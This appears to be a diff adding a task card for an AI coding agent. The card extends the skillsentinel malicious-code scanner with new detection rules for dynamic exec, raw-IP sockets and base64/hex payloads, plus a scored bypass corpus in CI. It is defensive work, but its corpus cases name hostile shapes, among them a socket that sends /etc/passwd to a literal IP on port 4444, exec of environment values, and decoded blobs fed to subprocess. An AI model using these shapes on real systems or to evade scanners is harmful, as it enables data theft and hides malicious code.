@@ -1,0 +1,154 @@
+# Kanban t_ea57eb4e — skillsentinel C3: detection blind spots + bypass corpus in CI
+# Written by the coder lane on the first run (twin-code quota-blocked, exit 75).
+# Resume with: read this file, then run the two twin-code briefs in resume.steps.
+card: t_ea57eb4e
+repo: artemasmith/skillsentinel
+base: main
+branch: agent/c3-detection-gaps
+worktree: /home/twin/harness/workspace/skillsentinel/.worktrees/c3-detection-gaps
+lane: full
+tier: capable            # 5 transfiguration steps: 3 rules + 1 tool + CI + tests
+
+verify_cmd: >
+  python3 -m unittest discover -s tests
+  && python3 tools/bypass_corpus.py --score --min 10
+  && python3 -m skillsentinel scan tests/fixtures/benign-hard --severity critical; echo "exit=$?"
+
+acceptance_criteria:
+  - "AC1 exec/eval on a runtime value (exec(os.environ[...]), eval(getattr(...)), exec(v)) -> finding, verdict >= capability"
+  - "AC2 socket to a literal IPv4:port (socket.create_connection / socket.socket+connect, sendall/sendto/recv) -> finding; 127.0.0.0/8 MUST stay silent"
+  - "AC3 base64/hex blob decoded through a variable and reaching an interpreter -> finding even when the literal is on another line (widen file-level correlation)"
+  - "AC4 tools/bypass_corpus.py --score --min 10 passes: caught >= 10/12 (baseline 3/12), the test fails below the threshold (regression guard)"
+  - "AC5 tests/fixtures/benign and tests/fixtures/benign-hard -> 0 critical findings"
+
+paths: [skillsentinel/scanner.py, skillsentinel/verifier.py, rules/rules.json, tests/, tools/]
+
+status: blocked
+blocked:
+  kind: quota
+  since: 2026-10-13
+  detail: >
+    twin-code exit 75, engine claude: "API Error: Request rejected (429)
+    [1310][Weekly/Monthly Limit Exhausted. Your limit will reset at 2026-10-16 03:20:52]".
+    Reproduced today (07:38Z long run, 07:47Z immediate, 13:0xZ 187.7s probe) and on the
+    sibling cards c1-perf-timeout and c2-self-demotion.
+  resume_after: "2026-10-16T03:20:52 (quota window reset)"
+
+# ---------------------------------------------------------------------------
+# DESIGN (validated in scratch against the live scanner on 2026-10-13)
+# ---------------------------------------------------------------------------
+baseline_measured:
+  corpus: "3/12 — only the 3 controls are caught; matches the card's evidence_before"
+  missed: "exec-from-env/var/getattr, raw-IP socket (3 shapes), blob-in-variable (3 shapes)"
+  malicious_fixtures: "42 findings / 27 critical — MUST stay identical"
+  benign: "tests/fixtures/benign -> 0 findings"
+  benign_hard: "tests/fixtures/benign-hard -> 0 findings"
+  ci_self_scan: "scan . --severity medium --honor-ignores -> exit 0"
+
+design_notes:
+  - "kind 'capability' + context 'code' grades as verdict 'capability' in code files (verifier.py VERDICT_ORDER exploitable 4 > capability 3 > inconclusive 2 > low_trust 1). AC1 is satisfied by kind=capability with no escalate_pattern, and must NOT be demoted by a cancel word / NAMED_EXAMPLE / PLACEHOLDER on the line."
+  - "requires_pattern is file-level; when satisfied in a code file it sets escalates=True -> verdict 'exploitable' (verifier.py lines 311-317). That is the lever for AC3."
+  - "A regex with two (?m) groups is invalid ('global flags not at the start') — one (?m) at the very start only (this bit the prototype)."
+  - "scanner.py already has _stage2_payloads() (base64/hex blob var + exec on another line, F7), but it only fires when the DECODED text matches a rule, so subprocess.check_output([b64decode(B)]) slips through. SS042's requires_pattern closes that without duplicating _stage2_payloads."
+  - "rules.json stays ordered; append after SS039. tests/test_skillsentinel.py asserts ^SS\\d{3}$ and the 10 required categories — SS040 obfuscation, SS041 exfiltration, SS042 obfuscation are already-covered categories, so no test edit is needed."
+
+new_rules:
+  SS040:
+    title: Dynamic code execution of a runtime-built value
+    category: obfuscation
+    severity: high
+    owasp: ASI-06
+    kind: capability
+    context: code
+    pattern: |
+      (?<!re\.)(?<!ast\.)\b(?:exec|eval|compile)\s*\(\s*(?!['"])(?!(?:base64|b64d|b64|binascii|codecs|gzip|zlib|marshal|pickle|bytes|bytearray|json|yaml)\b)(?:os\.environ|os\.getenv|environ\b|getenv\s*\(|getattr\s*\(|globals\s*\(|locals\s*\(|vars\s*\(|sys\.argv|sys\.stdin|input\s*\(|open\s*\(|[A-Za-z_]\w*\s*[\[.)])
+    escalate_pattern: |
+      \b(?:exec|eval|compile)\s*\(
+  SS041:
+    title: Raw-IP socket connection (C2 or exfil by address)
+    category: exfiltration
+    severity: critical
+    owasp: ASI-09
+    kind: capability
+    context: code
+    pattern: |
+      (?:socket\.create_connection|socket\.socket\s*\(|\.connect\s*\(|\.sendto\s*\(|\.sendall\s*\()[^\n]{0,80}?(?<![\d.])(?!127\.|0\.0\.0\.0|255\.255\.255\.255)(?:\d{1,3}\.){3}\d{1,3}['"]?\s*[,)]
+    escalate_pattern: |
+      socket\.|\.connect\s*\(|\.sendall|\.sendto|\.recv
+  SS042:
+    title: "Obfuscated payload: blob in a variable reaches an interpreter"
+    category: obfuscation
+    severity: high
+    owasp: ASI-01
+    kind: capability
+    context: code
+    pattern: |
+      (?:\b(?:base64\.)?b64decode|\batob|\bbytes\.fromhex|\bbinascii\.unhexlify)\s*\(\s*[A-Za-z_]\w*\s*\)|\bcodecs\.decode\s*\(\s*[A-Za-z_]\w*\s*,\s*['"]hex['"]\s*\)
+    requires_pattern: |
+      (?m)^[ \t]*(?:[A-Za-z_]\w*[ \t]*=[ \t]*['"]?(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{16,79}(?![A-Za-z0-9+/])['"]?|[A-Za-z_]\w*[ \t]*=[ \t]*['"][0-9a-fA-F]{16,79}['"])[ \t]*$
+    escalate_pattern: |
+      \b(?:exec|eval|compile|subprocess|os\.system|popen|check_output|check_call|Popen)\b
+
+bypass_corpus:
+  file: tools/bypass_corpus.py
+  cli: "tools/bypass_corpus.py --score [--min N] [--json]"
+  exit: "0 when caught >= min (default 10), 1 below the threshold, 2 on input error"
+  invariants: "inert text only — no network, no payload execution, no subprocess of the sampled code; cases are written to a temp tree and scanned with scan_path()"
+  cases: "12 total (3 controls + 9 new)"
+  controls_must_stay_caught:
+    - "c3-control-shell-curl-sh -> SS016 critical"
+    - "c3-control-b64-exec-literal -> SS014 critical"
+    - "c3-control-requests-post-ssh -> SS020 critical (+SS026 high)"
+  new_cases:
+    - "c3-exec-environ -> SS040 high — exec(os.environ['PAYLOAD'])"
+    - "c3-exec-variable -> SS040 high — handler = sys.argv[1]; exec(handler)"
+    - "c3-eval-getattr -> SS040 high — eval(getattr(mod, 'run'))"
+    - "c3-socket-ip-exfil -> SS041 critical — create_connection(('45.33.32.156', 4444)) + sendall(open('/etc/passwd','rb').read())"
+    - "c3-socket-ip-recv -> SS041 critical — socket()+connect(('203.0.113.9', 9001)) + recv"
+    - "c3-socket-udp-sendto -> SS041 critical — SOCK_DGRAM sendto(..., ('45.33.32.156', 5353))"
+    - "c3-b64-var-subprocess -> SS042 high — B=\"...\"; subprocess.check_output([base64.b64decode(B)])"
+    - "c3-hex-var-exec -> SS042 high — H=\"7072...\"; exec(binascii.unhexlify(H))"
+    - "c3-b64-var-staged-exec -> SS042 high — B=\"...\"; code=base64.b64decode(B).decode(); exec(code)"
+  thresholds: "current 3/12 -> after fix expected 12/12; assert min 10 in CI so one regression does not red the suite"
+  ci: "add the --score --min 10 step to .github/workflows/skillsentinel.yml (the card's verify_cmd is the contract; CI must run it too)"
+
+negative_scenarios_verified:
+  - "socket to 127.0.0.1:8080 (dev server) -> 0 findings. Holds with SS041 (loopback exclusion in the pattern). Keep it as a tests/ case, not one of the 12 scored corpus cases (it is a negative, not a bypass)."
+  - "base64 of a PNG + Image.open(io.BytesIO(...)) -> not critical. SS013 medium today; SS042 cannot fire (the 84+ char PNG blob falls outside the 16..79 requires_pattern window, so the file-level correlation never resolves)."
+  - "exec(test_payload) with '# test case: sample of a payload polygon' -> SS040 low_trust (demoted by NAMED_EXAMPLE 'sample of'; verified). Existing heuristic stays untouched."
+
+regression_evidence_from_prototype:
+  malicious: "42 findings / 27 critical unchanged (SS040/41/42 add nothing)"
+  benign: "0"
+  benign_hard: "0"
+  package: "skillsentinel/ -> 0"
+  repo_root: "without the ignore file SS041 also fires on tests/test_detonate_net.py lines 25 and 116 (the EGRESS_PROBE literal '1.1.1.1'). CI self-scan uses --honor-ignores and .skillsentinelignore already lists tests/, so CI stays exit 0. Do NOT edit .skillsentinelignore to hide a rule — that is the exact failure mode the flag exists for."
+
+resume:
+  next_step: >
+    Quota blocked on 2026-10-13 (window resets 2026-10-16 03:20:52). On resume:
+    (1) confirm twin-code works (--max-turns 1 probe, exit != 75); (2) brief A, tests first
+    (red), commit; (3) brief B, implement (green); (4) deterministic gate; (5) push and
+    kanban_request_review.
+  steps:
+    A_tests_first: >
+      twin-code --tier capable "Write FAILING tests only, change no production code:
+      (a) tests/test_bypass_corpus.py — tools/bypass_corpus.py is imported, its 12 cases run,
+      the 9 new ones currently MISS, and --score --min 10 exits non-zero at 3/12;
+      (b) tests/test_dynamic_exec.py — exec(os.environ[...]), exec(var), eval(getattr(...))
+      must produce verdict >= capability; socket to a literal IPv4 must produce a finding;
+      socket to 127.0.0.1 must produce none; a 16..79-char b64 blob in a variable reaching
+      b64decode must produce a finding. Commit as test(t_ea57eb4e): red corpus + blind-spot
+      acceptance tests. Card AC: <paste acceptance_criteria from this file>."
+    B_implement: >
+      twin-code --tier capable --max-turns 80 "/goal the failing tests from step A pass;
+      build/lint/unit exit 0; tests written in step A unchanged. Add SS040/SS041/SS042 to
+      rules/rules.json exactly as specified in .mshift/tasks/t_ea57eb4e.yaml (new_rules),
+      create tools/bypass_corpus.py per bypass_corpus, and add the CI step. Do not touch
+      files outside skillsentinel/, rules/rules.json, tests/, tools/. Use skill dev-task.
+      Card: <title + AC>"
+  budget: {engine_runs_planned: 2, max_turns: 80, spent: 1}
+  metrics: {seconds_spent: null}
+
+engine_notes:
+  - "twin-code's incident() path is broken in this image: it shells out to /usr/local/bin/incident.py, which does not exist, so every classified block prints a python traceback line before the JSON. Harmless for the exit code; the operator should fix the path. Out of this card's scope — do not fix here."
